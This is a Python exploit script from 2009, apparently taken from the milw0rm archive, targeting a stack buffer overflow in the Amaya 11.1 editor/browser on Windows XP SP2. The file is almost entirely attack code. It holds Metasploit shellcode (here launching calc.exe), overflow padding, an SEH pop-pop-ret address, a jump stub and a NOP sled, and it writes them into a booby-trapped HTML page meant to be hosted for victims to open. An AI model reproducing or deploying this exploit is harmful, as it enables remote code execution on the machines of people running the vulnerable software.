# exploit.py
#
# Amaya 11.1 W3C Editor/Browser (defer) Stack Overflow Exploit
# By: Encrypt3d.M!nd
#
# Origninal Advisory:
# http://www.milw0rm.com/exploits/8314
#
# Fully Based on Rob Carter's Exploit
# http://www.milw0rm.com/exploits/7988
#
# Note:you need to upload Devil_inside.html to a remote host
# Works with windows xp sp2
#


# metasploit - run calc.exe

shellcode = (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x48\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x63"
"\x58\x30\x41\x30\x50\x41\x6b\x41\x41\x73\x32\x41\x42\x41\x32\x42"
"\x42\x30\x42\x42\x58\x42\x50\x38\x41\x42\x75\x4d\x39\x59\x6c\x4d"
"\x38\x42\x64\x33\x30\x37\x70\x47\x70\x4e\x6b\x52\x65\x65\x6c\x6e"
"\x6b\x41\x6c\x74\x45\x70\x78\x65\x51\x6a\x4f\x6c\x4b\x50\x4f\x74"
"\x58\x4c\x4b\x53\x6f\x55\x70\x46\x61\x4a\x4b\x72\x69\x6e\x6b\x35"
"\x64\x4c\x4b\x35\x51\x48\x6e\x66\x51\x4b\x70\x4a\x39\x6e\x4c\x4e"
"\x64\x4b\x70\x43\x44\x66\x67\x4b\x71\x4b\x7a\x44\x4d\x55\x51\x58"
"\x42\x58\x6b\x6c\x34\x77\x4b\x30\x54\x35\x74\x37\x74\x54\x35\x68"
"\x65\x4e\x6b\x31\x4f\x54\x64\x47\x71\x6a\x4b\x55\x36\x4e\x6b\x76"
"\x6c\x30\x4b\x4e\x6b\x51\x4f\x55\x4c\x35\x51\x7a\x4b\x4e\x6b\x45"
"\x4c\x4c\x4b\x46\x61\x48\x6b\x4f\x79\x53\x6c\x36\x44\x54\x44\x79"
"\x53\x30\x31\x6f\x30\x50\x64\x4c\x4b\x33\x70\x46\x50\x4f\x75\x6f"
"\x30\x70\x78\x34\x4c\x4e\x6b\x57\x30\x66\x6c\x4e\x6b\x50\x70\x35"
"\x4c\x4e\x4d\x6e\x6b\x52\x48\x53\x38\x4a\x4b\x53\x39\x4c\x4b\x4f"
"\x70\x6e\x50\x35\x50\x55\x50\x53\x30\x6e\x6b\x53\x58\x57\x4c\x53"
"\x6f\x74\x71\x7a\x56\x51\x70\x70\x56\x6f\x79\x39\x68\x4c\x43\x69"
"\x50\x43\x4b\x30\x50\x71\x78\x78\x70\x4f\x7a\x37\x74\x73\x6f\x75"
"\x38\x6c\x58\x6b\x4e\x4f\x7a\x56\x6e\x73\x67\x79\x6f\x4b\x57\x35"
"\x33\x35\x31\x32\x4c\x45\x33\x47\x70\x63")


chars = "\x41" * 6887
chars+= "\x74\x06\x41\x41"	        # jmp short 06
chars+= "\x17\x19\x10\x02"	        # 0x02101917 - pop pop ret in amaya module
chars+= "\x68\x7f\x01\x01\x7f"		# push 7f01017f
chars+= "\x58"				# pop eax
chars+= "\x2d\x18\x69\x45\x7d"		# sub eax,7a7a0857
chars+= "\x50"				# push eax
chars+= "\xc3"				# retn
chars+= "\x90" * 100
chars+=shellcode

header= ('<script defer="'+chars+'">')

file=open('Devil_inside.html','w')
file.write(header)
file.close()

# milw0rm.com [2009-03-30]
